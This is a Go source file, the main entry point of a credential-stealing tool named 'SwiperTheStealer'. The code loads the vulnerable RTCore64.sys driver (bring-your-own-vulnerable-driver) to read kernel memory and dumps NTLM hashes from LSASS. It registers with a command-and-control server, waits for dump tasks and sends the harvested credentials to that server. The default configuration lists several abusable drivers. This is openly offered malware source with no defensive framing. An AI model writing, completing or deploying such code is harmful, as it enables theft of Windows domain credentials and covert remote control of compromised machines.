package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/internal/c2client"
	"swiper-the-stealer/internal/config"
	"swiper-the-stealer/internal/lsass"
	"swiper-the-stealer/pkg/logger"
)

const (
	DefaultConfigPath = "./config.json"
	AppVersion       = "1.0.0"
	AppName          = "SwiperTheStealer - Advanced Credential Extraction Engine"
)

var (
	configPath  = flag.String("config", DefaultConfigPath, "Path to configuration file")
	logLevel    = flag.String("log", "INFO", "Log level (DEBUG, INFO, WARN, ERROR)")
	testMode    = flag.Bool("test", false, "Run in test mode (RTCore64 exploit test only)")
	noC2        = flag.Bool("no-c2", false, "Run without C2 communication (standalone mode)")
	showVersion = flag.Bool("version", false, "Show version information")
)

func main() {
	// Create debug log file immediately
	debugFile, err := os.Create("debug.log")
	if err == nil {
		fmt.Fprintf(debugFile, "[DEBUG] SwiperTheStealer starting at %s\n", time.Now().Format("2006-01-02 15:04:05"))
		debugFile.Close()
	}
	
	flag.Parse()
	
	fmt.Println("SwiperTheStealer v1.0.0 - Initialization started...")

	if *showVersion {
		fmt.Printf("%s v%s\n", AppName, AppVersion)
		fmt.Println("Advanced Credential Extraction Engine with BYOVD RTCore64.sys")
		fmt.Println("Professional Go implementation - Configurable - Maximum stealth")
		fmt.Println("Integrates RTCore privilege escalation with advanced memory parsing")
		fmt.Println("Connects to C2 server for remote credential harvesting")
		os.Exit(0)
	}

	// Initialize logger
	log := logger.NewLogger(*logLevel)
	log.Infof("🚀 Starting %s v%s", AppName, AppVersion)

	// Load configuration
	cfg, err := config.LoadConfig(*configPath)
	if err != nil {
		log.Errorf("Failed to load configuration: %v", err)
		log.Info("Creating default configuration...")
		
		cfg = createDefaultConfig()
		if err := cfg.SaveConfig(*configPath); err != nil {
			log.Errorf("Failed to save default configuration: %v", err)
		} else {
			log.Infof("Default configuration saved to %s", *configPath)
		}
	}

	log.Infof("Configuration loaded successfully from %s", *configPath)

	// Initialize RTCore BYOVD exploit
	log.Info("🔥 Initializing RTCore BYOVD exploit...")
	exploit := byovd.NewRTCoreExploit(log)
	
	// Actually initialize the RTCore connection
	log.Info("📡 Attempting RTCore64.sys device connection...")
	err = exploit.Initialize()
	if err != nil {
		log.Warnf("⚠️  RTCore64.sys initialization failed: %v", err)
		log.Warn("⚠️  This is expected without MSI Afterburner - continuing with limited functionality...")
	} else {
		log.Info("✅ RTCore64.sys device connection established")
		defer exploit.Close()
	}

	log.Info("✅ RTCore BYOVD exploit initialized successfully")

	// Test mode - verify RTCore functionality only
	if *testMode {
		log.Info("Running in test mode - verifying RTCore functionality...")
		
		// Test basic memory access
		testAddr := uint64(0x1000)
		testData, err := exploit.ReadPhysicalMemory(testAddr, 0x100)
		if err != nil {
			log.Errorf("RTCore test failed: %v", err)
			os.Exit(1)
		}
		
		log.Infof("✅ RTCore test successful - read %d bytes from 0x%x", len(testData), testAddr)
		log.Info("RTCore64.sys is operational and ready for credential extraction")
		return
	}

	// Initialize SwiperTheStealer Extraction Engine
	log.Info("🔥 Initializing SWIPERTHESTALER EXTRACTION ENGINE...")
	log.Info("💀 RTCore + SwiperTheStealer Algorithm = Ultimate Credential Harvester")
	
	swiperExtractor, err := lsass.NewSwiperTheStealer(exploit, log)
	if err != nil {
		log.Errorf("Failed to create SwiperTheStealer extractor: %v", err)
		log.Warn("⚠️  SwiperTheStealer initialization failed")
	}
	
	log.Info("✅ SwiperTheStealer extraction engine initialized successfully")

	// Standalone mode - perform SwiperTheStealer credential extraction
	if *noC2 {
		log.Info("Running in standalone mode - performing SwiperTheStealer credential extraction...")
		
		if swiperExtractor == nil {
			log.Error("SwiperTheStealer extractor not available")
			os.Exit(1)
		}
		
		credentials, err := swiperExtractor.Execute()
		if err != nil {
			log.Errorf("SwiperTheStealer credential extraction failed: %v", err)
			log.Error("Check RTCore driver access and LSASS process availability")
			os.Exit(1)
		}
		
		log.Infof("✅ Successfully extracted %d credential sets:", len(credentials))
		for i, cred := range credentials {
			log.Infof("🔑 Credential %d: %s\\%s", i+1, cred.Domain, cred.Username)
			if cred.NTLM != "" {
				log.Infof("   NTLM: %s", cred.NTLM)
			}
			log.Infof("   Type: %s", cred.Type)
		}
		
		log.Info("🎉 Standalone native credential extraction completed successfully")
		return
	}

	// Initialize C2 client
	c2 := c2client.NewC2Client(&cfg.C2, log)
	
	log.Info("Registering with Kali C2 server...")
	if err := c2.Register(); err != nil {
		log.Errorf("Failed to register with C2 server: %v", err)
		log.Info("Check C2 server configuration and network connectivity")
		log.Info("Retrying registration in 5 seconds...")
		time.Sleep(5 * time.Second)
		
		// Try one more time
		if err := c2.Register(); err != nil {
			log.Errorf("Registration retry failed: %v", err)
			log.Info("Falling back to standalone mode...")
			
			// Run standalone SwiperTheStealer extraction
			if swiperExtractor == nil {
				log.Error("SwiperTheStealer extractor not available for fallback")
				os.Exit(1)
			}
			
			credentials, err := swiperExtractor.Execute()
			if err != nil {
				log.Errorf("Standalone SwiperTheStealer extraction failed: %v", err)
				os.Exit(1)
			}
			
			log.Infof("Standalone mode - extracted %d credentials:", len(credentials))
			for i, cred := range credentials {
				log.Infof("🔑 Credential %d: %s\\%s", i+1, cred.Domain, cred.Username)
				if cred.NTLM != "" {
					log.Infof("   NTLM: %s", cred.NTLM)
				}
			}
			
			return
		}
	}

	log.Infof("Successfully registered with C2 server as agent: %s", c2.GetAgentID())

	// Create SwiperTheStealer dump handler for C2 commands
	dumpHandler := func(taskID string) error {
		log.Infof("🎯 Executing SwiperTheStealer credential dump for task: %s", taskID)
		
		if swiperExtractor == nil {
			return fmt.Errorf("SwiperTheStealer extractor not available")
		}
		
		credentials, err := swiperExtractor.Execute()
		if err != nil {
			log.Errorf("SwiperTheStealer extraction failed for task %s: %v", taskID, err)
			return err
		}
		
		log.Infof("✅ Successfully extracted %d credentials for task %s", len(credentials), taskID)
		
		// Convert SwiperTheStealer credentials to C2 format
		c2Credentials := make([]lsass.LSASSCredentials, len(credentials))
		for i, directCred := range credentials {
			c2Credentials[i] = lsass.LSASSCredentials{
				Username: directCred.Username,
				Domain:   directCred.Domain,
				NTLM:     directCred.NTLM,
				LM:       "", // Not extracted by SwiperTheStealer
				SHA1:     "", // Not extracted by SwiperTheStealer
			}
		}
		
		// Send credentials to C2 server
		if err := c2.SendCredentials(c2Credentials, taskID); err != nil {
			log.Errorf("Failed to send credentials to C2 server: %v", err)
			return err
		}
		
		log.Infof("📡 Credentials successfully transmitted to C2 server for task %s", taskID)
		
		return nil
	}

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	stopChan := make(chan bool, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Start C2 command processing loop in goroutine
	go c2.StartCommandLoop(dumpHandler, stopChan)

	log.Info("🔥 BYOVD RTCore + SwiperTheStealer ENGINE is operational and awaiting C2 commands...")
	log.Info("💀 Ready for credential extraction with SwiperTheStealer algorithm + RTCore privilege escalation")
	log.Info("📡 Connected to Kali C2 server - monitoring for dump commands")
	log.Info("🚀 EXACT MIMIKATZ ALGORITHM - ULTIMATE POWER!")
	log.Info("Press Ctrl+C to shutdown gracefully")

	// Wait for shutdown signal
	<-sigChan
	log.Info("Shutdown signal received, terminating agent...")
	
	// Signal C2 loop to stop
	stopChan <- true
	
	// Give time for cleanup
	time.Sleep(2 * time.Second)
	
	log.Info("🛑 SwiperTheStealer shutdown complete")
}

// createDefaultConfig creates a default configuration structure
func createDefaultConfig() *config.Config {
	return &config.Config{
		C2: config.C2Config{
			ServerURL:         "http://localhost:8080",
			APIKey:            "your-api-key-here",
			SkipTLSVerify:     false,
			TimeoutSeconds:    30,
			RequestTimeout:    30,
			HeartbeatInterval: 60,
			CheckinInterval:   10,
			RetryAttempts:     3,
			RetryDelayMs:      5000,
			PollIntervalSec:   5,
		},
		BYOVD: config.BYOVDConfig{
			PreferredDriver: "RTCore64.sys",
			ScanDrivers: []string{
				"RTCore64.sys",
				"DBUtilDrv2.sys",
				"gdrv.sys",
			},
			MemoryScanSize: 1024 * 1024, // 1MB
		},
		Logging: config.LoggingConfig{
			Level:      "INFO",
			OutputFile: "./swiper-the-stealer.log",
		},
	}
}
